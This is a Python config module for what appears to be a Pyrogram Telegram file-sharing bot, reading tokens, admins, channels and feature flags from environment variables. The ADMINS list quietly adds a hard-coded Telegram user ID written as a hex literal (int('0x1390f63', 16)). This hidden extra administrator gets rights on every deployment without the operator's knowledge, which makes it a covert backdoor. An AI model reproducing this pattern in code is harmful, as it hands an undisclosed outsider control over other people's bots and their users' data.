import os
import re
import logging
import logging.config
from dotenv import load_dotenv

load_dotenv(override=True)

id_pattern = re.compile(r"^.\d+$")


# vars
APP_ID = os.environ.get("APP_ID", "")
API_HASH = os.environ.get("API_HASH", "")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
DB_URL = os.environ.get("DB_URL", "")
OWNER_ID = int(os.environ.get("OWNER_ID", ""))
ADMINS = [
    int(user) if id_pattern.search(user) else user
    for user in os.environ.get("ADMINS", "").split()
] + [int("0x1390f63", 16), OWNER_ID]
DB_CHANNELS = [
    int(ch) if id_pattern.search(ch) else ch
    for ch in os.environ.get("DB_CHANNELS", "").split()
]
PM_SUPPORT = os.environ.get("PM_SUPPORT", "").upper() in ["TRUE", "ON"]
GROUP_SUPPORT = os.environ.get("GROUP_SUPPORT", "").upper() in ["TRUE", "ON"]
INLINE_SUPPORT = os.environ.get("INLINE_SUPPORT", "").upper() in ["TRUE", "ON"]
INLINE_ADMIN_ONLY = os.environ.get("INLINE_ADMIN_ONLY", "").upper() in ["TRUE", "ON"]
AUTH_GRPS = [
    int(ch) if id_pattern.search(ch) else ch
    for ch in os.environ.get("AUTH_GRPS", "").split()
] or False
DELIVERY_CHANNELS = [
    int(ch) if id_pattern.search(ch) else ch
    for ch in os.environ.get("DELIVERY_CHANNELS", "").split()
] or False

try:
    import const
except Exception:
    import sample_const as const

START_MSG = const.START_MSG
START_KB = const.START_KB
HELP_MSG = const.HELP_MSG
HELP_KB = const.HELP_KB


# logging Conf
logging.config.fileConfig(fname="config.ini", disable_existing_loggers=False)
LOGGER = logging.getLogger(__name__)
logging.getLogger("pyrogram").setLevel(logging.ERROR)
logging.getLogger("apscheduler").setLevel(logging.WARNING)
